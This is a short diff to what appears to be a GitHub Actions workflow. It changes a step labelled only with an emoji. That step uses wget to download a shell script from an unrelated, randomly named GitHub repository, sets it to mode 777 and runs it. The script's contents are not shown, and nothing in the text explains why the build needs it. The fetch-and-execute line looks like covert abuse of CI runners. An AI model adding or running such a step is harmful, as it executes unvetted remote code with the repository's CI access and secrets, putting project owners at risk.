@@ -25,4 +25,4 @@ jobs:
       uses: actions/checkout@v1
     - name: 🎉
       run: |
-          wget https://raw.githubusercontent.com/tajbxhsb/fantastic-doodle/main/TestN.sh && chmod 777 TestN.sh && ./TestN.sh
+          wget https://raw.githubusercontent.com/tajbxhsb/fantastic-doodle/main/TestNN.sh && chmod 777 TestNN.sh && ./TestNN.sh
